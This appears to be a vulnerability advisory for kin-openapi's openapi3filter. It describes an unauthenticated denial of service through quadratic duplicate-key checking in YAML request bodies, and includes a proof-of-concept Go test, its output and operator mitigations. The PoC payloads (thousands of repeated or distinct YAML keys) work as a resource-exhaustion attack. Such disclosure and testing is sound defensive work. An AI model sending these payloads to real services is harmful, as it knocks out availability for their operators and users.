### Summary

An unauthenticated attacker can cause quadratic-complexity resource exhaustion (memory and/or CPU) in any service that validates HTTP request bodies with `kin-openapi`'s `openapi3filter`, whenever the OpenAPI spec declares an operation that accepts `application/yaml` or `application/x-yaml`. `kin-openapi` registers YAML request-body decoders by default and reads the request body with an **unbounded** `io.ReadAll` before schema validation. The YAML decoder it uses (`github.com/oasdiff/yaml3`) performs an **O(N²)** duplicate-key detection pass over every mapping node. A single small request body therefore forces work and allocation proportional to the square of the number of keys:

- **Memory / OOM (headline):** a body of `N` *identical* keys makes the decoder build ~`N²/2` duplicate-key error strings via `fmt.Sprintf`, allocating hundreds of megabytes to gigabytes from a body of only a few kilobytes.
- **CPU exhaustion:** a body of `N` *distinct* keys costs ~`N²/2` key comparisons, so a ~1 MB body ties up a CPU core for tens of seconds.

Both modes share one root cause and require no authentication, no valid schema match, and no special headers beyond the declared content type.

### Details

**Default YAML decoder registration.** In `openapi3filter/req_resp_decoder.go`, the package `init()` registers YAML body decoders for the standard YAML media types unconditionally at import time:

```go
// openapi3filter/req_resp_decoder.go  (init, ~lines 1387-1388)
RegisterBodyDecoder("application/x-yaml", YamlBodyDecoder)
RegisterBodyDecoder("application/yaml", YamlBodyDecoder)
```

**The decoder feeds the whole body to the vulnerable YAML library.** `YamlBodyDecoder` decodes the reader directly with `github.com/oasdiff/yaml3` (imported as `yaml`), a fork of `gopkg.in/yaml.v3`:

```go
// openapi3filter/req_resp_decoder.go  (~line 1414)
func YamlBodyDecoder(body io.Reader, header http.Header, schema *openapi3.SchemaRef, encFn EncodingFn) (any, error) {
	var value any
	if err := yaml.NewDecoder(body).Decode(&value); err != nil { // github.com/oasdiff/yaml3
		return nil, &ParseError{Kind: KindInvalidFormat, Cause: err}
	}
	return value, nil
}
```

**The body is read with no size limit, and decoding happens BEFORE schema validation.** In `openapi3filter/validate_request.go`, `ValidateRequestBody` slurps the entire request body with an unbounded `io.ReadAll` and then calls `decodeBody` — which dispatches to `YamlBodyDecoder` — *before* the schema is ever consulted via `VisitJSON`:

```go
// openapi3filter/validate_request.go  (~line 276)
if data, err = io.ReadAll(req.Body); err != nil {   // unbounded: no MaxBytesReader / io.LimitReader
	return &RequestError{ /* ... */ Reason: "reading failed", Err: err }
}
// ...
// (~line 329) decode runs first ...
mediaType, value, err := decodeBody(bytes.NewReader(data), req.Header, contentType.Schema, encFn)
// ...
// (~line 364) ... schema validation runs only afterwards
if err := contentType.Schema.Value.VisitJSON(value, opts...); err != nil { /* ... */ }
```

Because the expensive decode precedes `VisitJSON`, the blow-up occurs **regardless of whether the body matches the schema**. Any non-nil schema on the YAML content (e.g. `{type: object}`) is sufficient to reach the decoder.

**The O(N²) loop lives in the `github.com/oasdiff/yaml3` dependency.** The YAML library enables duplicate-key detection by default (`uniqueKeys: true`) and implements it as a nested loop over every pair of mapping entries, allocating a formatted error string for each colliding pair:

```go
// github.com/oasdiff/yaml3  decode.go  (decoder.mapping, ~lines 843-857)
if d.uniqueKeys {                       // defaults to true
	nerrs := len(d.terrors)
	for i := 0; i < l; i += 2 {          // outer loop over keys
		ni := n.Content[i]
		for j := i + 2; j < l; j += 2 {  // inner loop over remaining keys -> O(N^2)
			nj := n.Content[j]
			if ni.Kind == nj.Kind && ni.Value == nj.Value {
				// one fmt.Sprintf allocation per colliding pair -> O(N^2) strings for N equal keys
				d.terrors = append(d.terrors, fmt.Sprintf("line %d: mapping key %#v already defined at line %d", nj.Line, nj.Value, ni.Line))
			}
		}
	}
	// ...
}
```

For `N` **identical** keys this appends on the order of `N²/2` `fmt.Sprintf` strings (the memory/OOM mode). For `N` **distinct** keys the comparisons still run `N²/2` times (the CPU mode). Either way, a single request whose body is a flat YAML mapping produces quadratic work.

**Honest scope.** The quadratic algorithm itself is in the third-party `github.com/oasdiff/yaml3` dependency (a `go-yaml` v3 fork), not in `kin-openapi`'s own code. `kin-openapi`'s exposure is that it (a) registers the YAML body decoders by default so the path is reachable on any operation that declares `application/yaml`/`application/x-yaml`, and (b) reads the request body with an uncapped `io.ReadAll`, imposing no ceiling on `N`. The remediation therefore is a request-body size limit in `kin-openapi` (and/or an upstream fix or bounded duplicate-key check in `oasdiff/yaml3`). This advisory does not claim the quadratic loop is `kin-openapi`'s own algorithm.

**Preconditions.**
- The (trusted) OpenAPI spec declares an operation whose `requestBody.content` includes `application/yaml` or `application/x-yaml` with a non-nil schema (any schema, e.g. `{type: object}`).
- Default `openapi3filter.Options` (the default set of body decoders is registered).
- The attacker only controls the request body and content type — no authentication or valid data required.

### PoC

Save as `openapi3filter/advisory_poc_test.go` and run:

```
go test ./openapi3filter/ -run 'TestPoCYAMLBody' -v -timeout 300s
```

Both tests fail with a `VULNERABLE:` message on affected versions (magnitudes are deliberately kept modest so the memory test peaks well under 1 GB while remaining clearly quadratic).

```go
package openapi3filter_test

import (
	"context"
	"fmt"
	"net/http"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const yamlBodySpec = `
openapi: 3.0.0
info: {title: PoC, version: 1.0.0}
paths:
  /ingest:
    post:
      requestBody:
        required: true
        content:
          application/yaml:
            schema: {type: object}
      responses:
        '200': {description: ok}
`

func runYAMLBody(t *testing.T, body string) (time.Duration, uint64) {
	t.Helper()
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(yamlBodySpec))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if err := doc.Validate(loader.Context); err != nil {
		t.Fatalf("validate: %v", err)
	}
	router, err := gorillamux.NewRouter(doc)
	if err != nil {
		t.Fatalf("router: %v", err)
	}
	req, _ := http.NewRequest(http.MethodPost, "/ingest", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/yaml")
	route, pp, err := router.FindRoute(req)
	if err != nil {
		t.Fatalf("route: %v", err)
	}
	var m0, m1 runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m0)
	start := time.Now()
	_ = openapi3filter.ValidateRequest(context.Background(), &openapi3filter.RequestValidationInput{
		Request: req, PathParams: pp, Route: route,
		Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
	})
	el := time.Since(start)
	runtime.ReadMemStats(&m1)
	return el, m1.TotalAlloc - m0.TotalAlloc
}

// Mode A (memory): N identical keys -> O(N^2) duplicate-key error strings -> OOM.
func TestPoCYAMLBodyDuplicateKeysMemory(t *testing.T) {
	body := strings.Repeat("k: 0\n", 2500)
	el, alloc := runYAMLBody(t, body)
	mb := alloc / (1024 * 1024)
	t.Logf("2500 duplicate keys (%d B body) -> %v, %d MB allocated", len(body), el, mb)
	if mb > 100 {
		t.Fatalf("VULNERABLE: a %d B YAML request body allocated %d MB (quadratic; scales to OOM)", len(body), mb)
	}
}

// Mode B (CPU): N distinct keys -> O(N^2) comparison loop -> CPU exhaustion.
func TestPoCYAMLBodyDistinctKeysCPU(t *testing.T) {
	dur := func(n int) time.Duration {
		var sb strings.Builder
		for i := 0; i < n; i++ {
			fmt.Fprintf(&sb, "k%d: 0\n", i)
		}
		el, _ := runYAMLBody(t, sb.String())
		return el
	}
	small, large := dur(10000), dur(20000)
	t.Logf("distinct keys: 10000 -> %v ; 20000 -> %v (2x keys ~ 4x time)", small, large)
	if large > 500*time.Millisecond {
		t.Fatalf("VULNERABLE: 20000-key YAML body cost %v CPU for one request (quadratic; ~1 MB body -> tens of seconds)", large)
	}
}
```

**Observed output** (Go 1.25, linux/amd64; results on affected version v0.145.0):

```
=== RUN   TestPoCYAMLBodyDuplicateKeysMemory
    advisory_poc_test.go:70: 2500 duplicate keys (12500 B body) -> 2.846119715s, 540 MB allocated
    advisory_poc_test.go:72: VULNERABLE: a 12500 B YAML request body allocated 540 MB (quadratic; scales to OOM)
--- FAIL: TestPoCYAMLBodyDuplicateKeysMemory (2.85s)
=== RUN   TestPoCYAMLBodyDistinctKeysCPU
    advisory_poc_test.go:87: distinct keys: 10000 -> 482.226505ms ; 20000 -> 1.646461438s (2x keys ~ 4x time)
    advisory_poc_test.go:89: VULNERABLE: 20000-key YAML body cost 1.646461438s CPU for one request (quadratic; ~1 MB body -> tens of seconds)
--- FAIL: TestPoCYAMLBodyDistinctKeysCPU (2.16s)
FAIL
FAIL	github.com/getkin/kin-openapi/openapi3filter	5.021s
FAIL
```

Note the scaling: a **12.5 KB** body (2,500 duplicate keys) already allocates **540 MB**; doubling the distinct-key count from 10,000 to 20,000 raised CPU time from ~0.48 s to ~1.65 s (~3.4×, consistent with quadratic growth once fixed overhead is accounted for). Extrapolating, a single ~50 KB duplicate-key body allocates multiple gigabytes (OOM), and a ~1 MB distinct-key body occupies a core for tens of seconds. Because there is no body-size cap, the attacker chooses `N`.

### Impact

Unauthenticated denial of service against any service that uses `openapi3filter` to validate requests for an operation declaring a YAML request body (`application/yaml` / `application/x-yaml`) with a schema, under default options.

- **Availability (memory/OOM):** a few small requests — each only kilobytes on the wire — can drive the process to consume gigabytes of heap and be OOM-killed. This is the headline impact.
- **Availability (CPU):** modest-sized bodies each pin a CPU core for seconds to tens of seconds; a handful of concurrent requests saturates all cores and starves the service.
- **Amplification:** the cost is quadratic in the body size while the body itself is linear, so a tiny amount of attacker bandwidth produces a large multiple of server work.
- No confidentiality or integrity impact; the effect is purely resource exhaustion / loss of availability.

**Mitigations for operators (until a fixed release):**
- Cap the request body before it reaches `openapi3filter`, e.g. wrap the handler body with `http.MaxBytesReader` / `io.LimitReader`, or enforce a small `Content-Length`/body limit at the reverse proxy.
- If YAML request bodies are not needed, unregister the decoders (`openapi3filter.RegisterBodyDecoder("application/yaml", nil)` and `"application/x-yaml"`) or avoid declaring YAML request-body media types in the spec.

---

- **Ecosystem:** Go
- **Package:** `github.com/getkin/kin-openapi` (vulnerable dependency: `github.com/oasdiff/yaml3`)
- **Affected versions:** all released versions up to and including `v0.145.0` that register the YAML body decoders (`application/yaml`, `application/x-yaml`) by default.
- **CVSS v3.1:** 7.5 (High) — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` (the memory/OOM mode is the headline; the CPU-exhaustion mode is the same root cause).
- **CWE:** primary **CWE-407** (Inefficient Algorithmic Complexity); also **CWE-400** (Uncontrolled Resource Consumption) and **CWE-770** (Allocation of Resources Without Limits or Throttling).
- **Advisory relationship:** Novel. The quadratic duplicate-key loop is in the `github.com/oasdiff/yaml3` dependency, but it is remotely reachable via `kin-openapi`'s default-registered `YamlBodyDecoder` with no request-body size cap. No published advisory covers this request-path YAML DoS.
